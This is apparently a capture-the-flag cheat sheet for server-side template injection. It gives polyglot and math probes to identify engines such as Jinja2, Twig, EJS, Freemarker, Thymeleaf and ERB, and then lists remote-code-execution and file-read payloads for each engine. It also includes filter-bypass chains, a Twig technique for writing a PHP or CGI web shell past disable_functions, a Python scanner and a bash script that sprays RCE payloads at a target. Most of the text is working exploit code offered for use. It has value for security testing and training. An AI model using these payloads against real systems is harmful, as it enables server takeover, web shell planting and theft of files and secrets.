---

## SSTI Polyglot Detection

A universal detection string that triggers errors or output across multiple template engines simultaneously:

```
${{<%[%'"}}%\.
```

### How It Works
- `${}` — Triggers Freemarker, Java EL, Mako
- `{{}}` — Triggers Jinja2, Twig, Tornado, Handlebars, Nunjucks, Dot.js
- `<%%>` — Triggers ERB, EJS, ASP
- `[%%]` — Triggers Smarty
- `'"` — Breaks string literals
- `\` — Tests escape handling

### Engine-Specific Math Confirmation
After polyglot triggers an error, confirm with targeted math tests:

| Payload | Expected | Engine |
|---------|----------|--------|
| `${7*7}` | `49` | Freemarker, Mako, Java EL |
| `{{7*7}}` | `49` | Jinja2, Twig, Nunjucks, Tornado |
| `<%= 7*7 %>` | `49` | ERB (Ruby), EJS (Node.js) |
| `#{7*7}` | `49` | Slim, Pug (Jade) |
| `{{= 7*7}}` | `49` | Dot.js |
| `{{7*'7'}}` | `7777777` | Jinja2 (string repeat confirms Jinja2 vs Twig) |
| `{{7*'7'}}` | `49` | Twig (arithmetic, not string repeat) |

---

## Node.js Template Engines

### EJS (Embedded JavaScript)
```javascript
// Detection
<%= 7*7 %>
// Output: 49

// RCE
<%= global.process.mainModule.require('child_process').execSync('id') %>
<%= require('child_process').execSync('cat /etc/passwd') %>
<%= process.mainModule.require('child_process').execSync('whoami').toString() %>

// File read
<%= require('fs').readFileSync('/etc/passwd').toString() %>
<%= require('fs').readFileSync('/flag').toString() %>
<%= require('fs').readFileSync('/flag.txt','utf8') %>
```

### Nunjucks
```javascript
// Detection
{{7*7}}   // Output: 49

// RCE via range.constructor
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}

// Alternative RCE
{{range.constructor("return require('child_process').execSync('cat /flag')")()}}

// File read
{{range.constructor("return require('fs').readFileSync('/flag').toString()")()}}
```

### Pug (formerly Jade)
```javascript
// Detection
#{7*7}   // Output: 49

// RCE
- var x = global.process.mainModule.require
- x('child_process').exec('id')

// Inline
#{global.process.mainModule.require('child_process').execSync('whoami')}
```

### Dot.js (doT)
```javascript
// Detection
{{= 7*7}}   // Output: 49

// RCE
{{= global.process.mainModule.require('child_process').execSync('id') }}

// File read
{{= global.process.mainModule.require('fs').readFileSync('/flag').toString() }}
```

### Handlebars (advanced — requires helper or prototype pollution)
```javascript
// Standard Handlebars is logic-less, but with prototype pollution:
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('cat /flag');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

---

## Java Expression Language

### JSP Expression Language (EL)
```java
// Detection
${7*7}   // Output: 49

// Environment access
${applicationScope}
${header}
${initParam}

// RCE via Runtime
${Runtime.getRuntime().exec('id')}
${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}

// Shorter RCE payload
${T(java.lang.Runtime).getRuntime().exec('cat /flag')}
```

### Thymeleaf (Spring)
```java
// Detection — preprocessed expressions
[[${7*7}]]   // Output: 49

// URL-based injection
/path?lang=__${7*7}__   // Preprocessed expression

// RCE via SpEL
[[${T(java.lang.Runtime).getRuntime().exec('id')}]]

// File read
[[${T(java.nio.file.Files).readString(T(java.nio.file.Path).of('/flag'))}]]

// Alternative RCE (Spring Expression Language)
${T(java.lang.Runtime).getRuntime().exec(new java.lang.String[]{'cat','/flag'})}

// Using ProcessBuilder
${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('cat /flag').getInputStream()).useDelimiter('\\A').next()}
```

### Spring Expression Language (SpEL)
```java
// Detection
#{7*7}   // Output: 49

// RCE
#{T(java.lang.Runtime).getRuntime().exec('id')}

// With output capture
#{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('cat /flag').getInputStream())}

// Alternative (no external deps)
#{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\A').next()}
```

---

## Automated SSTI Engine Detection Script

```python
#!/usr/bin/env python3
"""Automated SSTI engine detection — probe all known template engine syntaxes."""
import requests
import sys
import urllib.parse
import re

def detect_ssti(url, param, method="GET", cookies=None):
    """Test a parameter for SSTI across all known template engines."""
    results = []
    headers = {"User-Agent": "Mozilla/5.0"}

    # Polyglot detection first
    polyglot = "${{<%[%'\"}}%\\."
    resp = _send(url, param, polyglot, method, cookies, headers)
    if resp and (resp.status_code == 500 or "error" in resp.text.lower() or "exception" in resp.text.lower()):
        results.append("[POLYGLOT] Error triggered — template engine likely present")

    # Engine-specific math probes
    probes = [
        # (name, payload, expected_output, engine)
        ("Jinja2/Twig {{7*7}}", "{{7*7}}", "49", "Jinja2 or Twig"),
        ("Jinja2 confirm {{7*'7'}}", "{{7*'7'}}", "7777777", "Jinja2 (not Twig)"),
        ("Twig confirm {{7*'7'}}", "{{7*'7'}}", "49", "Twig (not Jinja2)"),
        ("Freemarker ${7*7}", "${7*7}", "49", "Freemarker"),
        ("ERB <%= 7*7 %>", "<%= 7*7 %>", "49", "ERB (Ruby)"),
        ("EJS <%= 7*7 %>", "<%= 7*7 %>", "49", "EJS (Node.js)"),
        ("Tornado {{7*7}}", "{{7*7}}", "49", "Tornado"),
        ("Nunjucks {{7*7}}", "{{7*7}}", "49", "Nunjucks"),
        ("Dot.js {{= 7*7}}", "{{= 7*7}}", "49", "Dot.js"),
        ("Pug #{7*7}", "#{7*7}", "49", "Pug/Jade"),
        ("Mako ${7*7}", "${7*7}", "49", "Mako"),
        ("Smarty {7*7}", "{7*7}", "49", "Smarty"),
        ("Java EL ${7*7}", "${7*7}", "49", "Java EL"),
        ("Thymeleaf [[${7*7}]]", "[[${7*7}]]", "49", "Thymeleaf"),
        ("Spring #{7*7}", "#{7*7}", "49", "Spring EL"),
        ("Django {{7|add:7}}", "{{7|add:7}}", "14", "Django"),
    ]

    for name, payload, expected, engine in probes:
        resp = _send(url, param, payload, method, cookies, headers)
        if resp and expected in resp.text:
            # Verify it's not just echoing the payload
            if payload not in resp.text or (payload in resp.text and expected in resp.text.replace(payload, "")):
                results.append(f"[CONFIRMED] {name} → Engine: {engine}")

    # Error-based detection (trigger errors that reveal engine names)
    error_probes = [
        ("${foobar}", ["freemarker", "FreeMarker"]),
        ("{{foobar}}", ["jinja2", "Jinja2", "nunjucks", "Nunjucks", "twig", "Twig"]),
        ("<%= foobar %>", ["ERB", "erb", "EJS", "ejs"]),
        ("#{foobar}", ["pug", "Pug", "jade", "Jade", "SpEL"]),
        ("{foobar}", ["smarty", "Smarty"]),
    ]

    for payload, indicators in error_probes:
        resp = _send(url, param, payload, method, cookies, headers)
        if resp:
            for ind in indicators:
                if ind.lower() in resp.text.lower():
                    results.append(f"[ERROR] Payload '{payload}' revealed engine: {ind}")

    return results

def _send(url, param, value, method, cookies, headers):
    """Send request with SSTI payload."""
    try:
        if method.upper() == "GET":
            sep = "&" if "?" in url else "?"
            full_url = f"{url}{sep}{param}={urllib.parse.quote(value)}"
            return requests.get(full_url, headers=headers, cookies=cookies,
                              timeout=10, allow_redirects=True)
        else:
            return requests.post(url, data={param: value}, headers=headers,
                               cookies=cookies, timeout=10, allow_redirects=True)
    except Exception:
        return None

if __name__ == "__main__":
    target = sys.argv[1]
    param = sys.argv[2]
    method = sys.argv[3] if len(sys.argv) > 3 else "GET"
    print(f"[*] Testing SSTI on {target} parameter '{param}'")
    findings = detect_ssti(target, param, method)
    for f in findings:
        print(f"  [+] {f}")
    if not findings:
        print("  [-] No SSTI detected")
```

---

## Optimized RCE Payloads

### Jinja2 MRO Traversal
```python
# Standard MRO chain to RCE
{{ ''.__class__.__mro__[1].__subclasses__() }}  # List all subclasses

# Find Popen (usually index ~250-400, search output)
{{ ''.__class__.__mro__[1].__subclasses__()[X]('cat /flag',shell=True,stdout=-1).communicate() }}

# Alternative: config object
{{ config.__class__.__init__.__globals__['os'].popen('cat /flag').read() }}

# Using request object (Flask)
{{ request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__init__.__globals__['os'].popen('cat /flag').read() }}

# Compact version
{{ cycler.__init__.__globals__.os.popen('cat /flag').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('ls /').read() }}

# Bypass filters (no underscores)
{{ lipsum|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("os")|attr("popen")("cat /flag")|attr("read")() }}

# Bypass filters (no dots)
{{ lipsum['__globals__']['os']['popen']('cat /flag')['read']() }}
```

### Jinja2 Heavy Filter Bypass (no `_`, `'`, `"`, `[`, `]`, hex escapes, keywords blocked)

When the app strips/blocks underscores, quotes, brackets, hex escapes, and keywords like `class`, `mro`, `import`, `os`:

```python
# Use {%print%} instead of {{}} when double-brace output is filtered
# Use |attr() for attribute access without dots or brackets
# Use format() to construct underscore char: '%c'|format(95) = '_'

# Build '__class__' string without underscores:
# '%c%cclass%c%c'|format(95,95,95,95) = '__class__'

# Full RCE chain smuggling blocked strings via request params:
{%print lipsum|attr(request.args.a)|attr(request.args.b)(request.args.c)|attr(request.args.d)(request.args.e)|attr(request.args.f)()%}
# URL: ?a=__globals__&b=__getitem__&c=os&d=popen&e=id&f=read

# Alternative: use request.cookies to smuggle blocked strings
{%print lipsum|attr(request.cookies.g)|attr(request.cookies.h)(request.cookies.i)|attr(request.cookies.j)(request.cookies.k)|attr(request.cookies.l)()%}
# Cookie: g=__globals__;h=__getitem__;i=os;j=popen;k=cat /flag;l=read

# Build underscore dynamically with format():
{%set u='%c'|format(95)%}{%set cc=u~u~'class'~u~u%}{%print ''|attr(cc)%}

# When even format is blocked, use chr via cycler globals:
{%set chr=cycler|attr(request.args.a)|attr(request.args.b)(request.args.c)%}
# Then build any string char by char
```

**Key pattern**: When direct payload chars are blocked, use Jinja2 `|format()`, `request` object, or `|attr()` chains to construct payload strings dynamically. Always try `{%print%}` as alternative to `{{}}`.

### Twig SSTI to RCE: Bypassing disable_functions / open_basedir

When PHP `disable_functions` blocks `system/exec/passthru/shell_exec/popen` and `open_basedir` restricts file access:

```php
// Step 1: Use sort() callback to call file_put_contents (not in disable_functions)
{{['<?php system(); ?>','/var/www/html/shell.php']|sort('file_put_contents')}}

// Step 2: If PHP execution is also restricted, write a CGI script + .htaccess
// Write .htaccess enabling CGI execution:
{{['Options +ExecCGI\nAddHandler cgi-script .cgi','/var/www/html/.htaccess']|sort('file_put_contents')}}

// Write CGI shell script:
{{['#!/bin/bash\necho Content-Type: text/plain\necho\n','/var/www/html/cmd.cgi']|sort('file_put_contents')}}

// Step 3: Make CGI executable via sort() + chmod
{{['/var/www/html/cmd.cgi',0755]|sort('chmod')}}

// Step 4: Access /cmd.cgi?id to execute commands
```

**Key insight**: `sort()` (and `filter()`, `map()`, `reduce()`) in Twig accept a callable as argument. Functions like `file_put_contents`, `chmod`, `rename`, `copy` are often NOT in `disable_functions`. Write a CGI script when PHP execution is locked down.

### Twig registerUndefinedFilterCallback
```php
// Twig 1.x
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}

// Twig 2.x / 3.x
{{['cat /flag']|filter('system')}}
{{['cat /flag']|map('system')}}
{{['cat /flag']|sort('system')}}
{{['cat /flag']|reduce('system')}}
```

### Freemarker Execute Class
```freemarker
// Standard
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /flag")}

// With output
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /flag")}

// ObjectConstructor (alternative)
<#assign oc="freemarker.template.utility.ObjectConstructor"?new()>
<#assign rt=oc("java.lang.ProcessBuilder", ["cat", "/flag"])>
${rt.start().inputStream.text}
```

### ERB (Ruby) — Quick RCE
```ruby
<%= `cat /flag` %>
<%= system("cat /flag") %>
<%= IO.popen("cat /flag").read %>
<%= File.read("/flag") %>
<%= Dir.glob("/flag*") %>
```

### Mako (Python)
```python
<%
import os
x = os.popen('cat /flag').read()
%>
${x}

## Shorter:
${__import__('os').popen('cat /flag').read()}
```

### Smarty (PHP)
```php
{system('cat /flag')}
{passthru('cat /flag')}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system('cat /flag'); ?>",self::clearConfig())}
```

### Quick Flag Finder (try all engines)
```bash
#!/bin/bash
# Try common SSTI payloads across all engines to extract flag
URL="$1"  # e.g., http://target.com/render?template=
PARAM="$2"  # e.g., template

declare -a PAYLOADS=(
  # Jinja2
  "{{config.__class__.__init__.__globals__['os'].popen('cat /flag*').read()}}"
  "{{cycler.__init__.__globals__.os.popen('cat /flag*').read()}}"
  # ERB
  "<%25=%20\`cat%20/flag*\`%20%25>"
  # Freemarker
  "<#assign ex=\"freemarker.template.utility.Execute\"?new()>\${ex(\"cat /flag*\")}"
  # EJS
  "<%25=%20require('child_process').execSync('cat /flag*').toString()%20%25>"
  # Nunjucks
  "{{range.constructor(\"return require('child_process').execSync('cat /flag*').toString()\")(}}"
  # Tornado
  "{%25%20import%20os%20%25}{{os.popen('cat /flag*').read()}}"
  # Twig
  "{{['cat /flag*']|filter('system')}}"
)

for payload in "${PAYLOADS[@]}"; do
  echo "[*] Testing: ${payload:0:60}..."
  RESP=$(curl -s "$URL?$PARAM=$payload" 2>/dev/null)
  if echo "$RESP" | grep -qiE "root:|uid=|secret|token|password"; then
    echo "[+] RCE confirmed — sensitive data in response!"
    echo "$RESP" | head -20
    exit 0
  fi
done
echo "[-] No flag found with standard payloads"
```
